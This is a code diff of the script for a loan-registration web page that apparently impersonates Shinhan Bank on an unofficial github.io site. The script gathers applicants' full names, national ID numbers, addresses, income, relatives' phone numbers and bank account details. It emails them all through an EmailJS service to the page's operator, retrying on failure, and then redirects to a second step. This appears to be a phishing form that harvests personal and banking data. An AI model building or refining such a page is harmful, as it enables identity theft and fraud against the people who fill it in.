-                relativePhone: document.getElementById('relativePhone').value.trim().replace(/\s/g, '').replace(/^\+84/, '0') || "",
-                relationship: document.getElementById('relationship').value || "",
-                accountName: document.getElementById('accountName').value.trim() || "",
-                accountNumber: document.getElementById('accountNumber').value.trim().replace(/\s/g, '') || "",
-                bankName: document.getElementById('bankName').value || "",
-                loanCode: "SHB" + Math.floor(100000 + Math.random() * 900000),
-                monthlyPayment: userData.monthlyPayment || "",
-                totalInterest: userData.totalInterest || "",
-                totalRepayment: userData.totalRepayment || "",
-                currentStep: 2,
-                isRegistered: true,
-                emailSent: false
-            };
+function saveFormDataRealTime() {
+    const loanAmountValue = $('#loanAmount').val();
+    const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
+    userData = {
+        fullName: $('#fullName').val().trim() || '',
+        dob: $('#dob').val() || '',
+        gender: $('#gender').val() || '',
+        contactAddress: $('#contactAddress').val().trim() || '',
+        hometown: $('#hometown').val().trim() || '',
+        nationality: $('#nationality').val().trim() || 'Việt Nam',
+        cccd: $('#cccd').val().trim() || '',
+        idIssueDate: $('#idIssueDate').val() || '',
+        issuePlace: $('#issuePlace').val() || '',
+        phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
+        email: $('#email').val().trim() || '',
+        loanType: $('#loanType').val() || '',
+        loanTerm: $('#loanTerm').val() || '',
+        loanAmount: loanAmount || '',
+        disbursementDate: $('#disbursementDate').val() || getCurrentDate(),
+        interestRate: parseFloat($('#interestRate').val()) || 7.0,
+        monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')) || '',
+        occupation: $('#occupation').val() || '',
+        loanPurpose: $('#loanPurpose').val() || '',
+        relativePhone: $('#relativePhone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
+        relationship: $('#relationship').val() || '',
+        accountName: $('#accountName').val().trim() || '',
+        accountNumber: $('#accountNumber').val().trim().replace(/\s/g, '') || '',
+        bankName: $('#bankName').val() || '',
+        monthlyPayment: userData.monthlyPayment || '',
+        totalInterest: userData.totalInterest || '',
+        totalRepay: userData.totalRepay || '',
+        currentStep: 1,
+        isRegistered: userData.isRegistered || false,
+        emailSent: userData.emailSent || false
+    };
+    saveToLocalStorage();
+}
 
-            if (!saveToLocalStorage()) {
-                spinner.style.display = 'none';
-                alert('Lỗi lưu dữ liệu. Vui lòng kiểm tra lại thông tin hoặc mục còn thiếu.');
-                console.error('LocalStorage save failed');
-                return;
-            }
+const debounceSave = debounce(saveFormDataRealTime, 300);
 
-            registeredUsers.push(userData.cccd);
-            localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
-            localStorage.setItem('registered', 'true');
+async function handleSubmit(event) {
+    event.preventDefault();
+    console.log('Form submission triggered');
+    if (!validateForm()) {
+        console.log('Validation failed, stopping submission');
+        return;
+    }
 
+    const spinner = $('.spinner-submit');
+    spinner.show();
+
+    const loanAmountValue = $('#loanAmount').val();
+    const loanAmount = loanAmountValue === 'other' ? $('#customLoanAmount').val().replace(/,/g, '') : loanAmountValue;
+    userData = {
+        fullName: $('#fullName').val().trim() || '',
+        dob: $('#dob').val() || '',
+        gender: $('#gender').val() || '',
+        contactAddress: $('#contactAddress').val().trim() || '',
+        hometown: $('#hometown').val().trim() || '',
+        nationality: $('#nationality').val().trim() || 'Việt Nam',
+        cccd: $('#cccd').val().trim() || '',
+        idIssueDate: $('#idIssueDate').val() || '',
+        issuePlace: $('#issuePlace').val() || '',
+        phone: $('#phone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
+        email: $('#email').val().trim() || '',
+        loanType: $('#loanType').val() || '',
+        loanTerm: $('#loanTerm').val() || '',
+        loanAmount: loanAmount || '',
+        disbursementDate: $('#disbursementDate').val() || getCurrentDate(),
+        interestRate: parseFloat($('#interestRate').val()) || 7.0,
+        monthlyIncome: parseFloat($('#monthlyIncome').val().replace(/,/g, '')) || '',
+        occupation: $('#occupation').val() || '',
+        loanPurpose: $('#loanPurpose').val() || '',
+        relativePhone: $('#relativePhone').val().trim().replace(/\s/g, '').replace(/^\+84/, '0') || '',
+        relationship: $('#relationship').val() || '',
+        accountName: $('#accountName').val().trim() || '',
+        accountNumber: $('#accountNumber').val().trim().replace(/\s/g, '') || '',
+        bankName: $('#bankName').val() || '',
+        loanCode: 'SHB' + Math.floor(100000 + Math.random() * 900000),
+        monthlyPayment: userData.monthlyPayment || '',
+        totalInterest: userData.totalInterest || '',
+        totalRepay: userData.totalRepay || '',
+        currentStep: 2,
+        isRegistered: true,
+        emailSent: false
+    };
+
+    if (!saveToLocalStorage()) {
+        spinner.hide();
+        alert('Lỗi lưu dữ liệu. Kiểm tra thông tin.');
+        console.error('LocalStorage save failed');
+        return;
+    }
+
+    registeredUsers.push(userData.cccd);
+    localStorage.setItem('registeredUsers', JSON.stringify(registeredUsers));
+    localStorage.setItem('isRegistered', 'true');
+
+    try {
+        if (!emailjs) throw new Error('EmailJS not initialized');
+        const response = await emailjs.send('service_60tgxof', 'template_uhyb8ve', {
+            full_name: userData.fullName,
+            dob: userData.dob,
+            gender: userData.gender,
+            contact_address: userData.contactAddress,
+            hometown: userData.hometown,
+            id_number: userData.cccd,
+            id_issue_date: userData.idIssueDate,
+            nationality: userData.nationality,
+            id_issue_place: userData.issuePlace,
+            phone_number: userData.phone,
+            email: userData.email,
+            loan_type: userData.loanType,
+            loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : '',
+            loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VNĐ' : '',
+            disbursement_date: userData.disbursementDate,
+            income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VNĐ' : '',
+            occupation: userData.occupation,
+            loan_purpose: userData.loanPurpose,
+            relative_phone: userData.relativePhone,
+            relationship: userData.relationship,
+            account_holder_name: userData.accountName,
+            account_number: userData.accountNumber,
+            bank_name: userData.bankName,
+            loan_code: userData.loanCode,
+            monthly_payment: userData.monthlyPayment ? userData.monthlyPayment.toLocaleString('vi-VN') + ' VNĐ' : '',
+            total_interest: userData.totalInterest ? userData.totalInterest.toLocaleString('vi-VN') + ' VNĐ' : '',
+            total_repayment: userData.totalRepay ? userData.totalRepay.toLocaleString('vi-VN') + ' VNĐ' : ''
+        });
+        console.log('Email sent:', response.status, response.text);
+        userData.emailSent = true;
+        saveToLocalStorage();
+        spinner.hide();
+        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
+    } catch (error) {
+        console.error('Email error:', error);
+        let retry = 2;
+        while (retry > 0) {
             try {
-                if (!emailjs) {
-                    throw new Error('EmailJS not initialized');
-                }
-                const response = await emailjs.send('service_60tgxof', 'template_uhyb8ve', {
-                    full_name: userData.fullName,
-                    dob: userData.dob,
-                    gender: userData.gender,
-                    contact_address: userData.contactAddress,
-                    hometown: userData.hometown,
-                    id_number: userData.cccd,
-                    id_issue_date: userData.idIssueDate,
-                    nationality: userData.nationality,
-                    id_issue_place: userData.issuePlace,
-                    phone_number: userData.phone,
-                    email: userData.email,
-                    loan_type: userData.loanType,
-                    loan_term: userData.loanTerm ? userData.loanTerm + ' tháng' : "",
-                    loan_amount: userData.loanAmount ? parseInt(userData.loanAmount).toLocaleString('vi-VN') + ' VND' : "",
-                    disbursement_date: userData.disbursementDate,
-                    income: userData.monthlyIncome ? userData.monthlyIncome.toLocaleString('vi-VN') + ' VND' : "",
-                    occupation: userData.occupation,
-                    loan_purpose: userData.loanPurpose,
-                    company_phone: userData.relativePhone,
-                    company_address: userData.relationship,
-                    account_holder_name: userData.accountName,
-                    account_number: userData.accountNumber,
-                    bank_name: userData.bankName,
-                    loan_code: userData.loanCode,
-                    monthly_payment: userData.monthlyPayment ? userData.monthlyPayment.toLocaleString('vi-VN') + ' VND' : "",
-                    total_interest: userData.totalInterest ? userData.totalInterest.toLocaleString('vi-VN') + ' VND' : "",
-                    total_repayment: userData.totalRepayment ? userData.totalRepayment.toLocaleString('vi-VN') + ' VND' : ""
-                });
-                console.log('Email sent:', response.status, response.text);
+                const response = await emailjs.send('service_60tgxof', 'template_uhyb8ve', { ...userData });
+                console.log('Email sent on retry:', response.status, response.text);
                 userData.emailSent = true;
                 saveToLocalStorage();
-                spinner.style.display = 'none';
+                spinner.hide();
                 window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
-            } catch (error) {
-                console.error('Email error:', error);
-                let retries = 2;
-                while (retries > 0) {
-                    try {
-                        const response = await emailjs.send('service_60tgxof', 'template_uhyb8ve', { ...userData });
-                        console.log('Email sent on retry:', response.status, response.text);
-                        userData.emailSent = true;
-                        saveToLocalStorage();
-                        spinner.style.display = 'none';
-                        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step2.html';
-                        return;
-                    } catch (retryError) {
-                        console.error(`Retry ${3 - retries} failed:`, retryError);
-                        retries--;
-                    }
-                }
-                console.error('Email failed after retries:', error);
-                spinner.style.display = 'none';
-                window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
+                return;
+            } catch (retryError) {
+                console.error(`Retry ${3 - retry} failed:`, retryError);
+                retry--;
             }
         }
+        console.error('Email failed after retries:', error);
+        spinner.hide();
+        alert('Gửi đăng ký thất bại do lỗi hệ thống. Vui lòng thử lại hoặc liên hệ hỗ trợ.');
+        window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step1.html';
+    }
+}
 
-        document.querySelectorAll('#registrationForm input, #registrationForm select').forEach(input => {
-            input.addEventListener('change', debouncedSave);
-        });
-    </script>
+$('#registrationForm input, #registrationForm select').on('change', debounceSave);
+window.onload = loadUserData;
+</script>
 </body>
 </html>
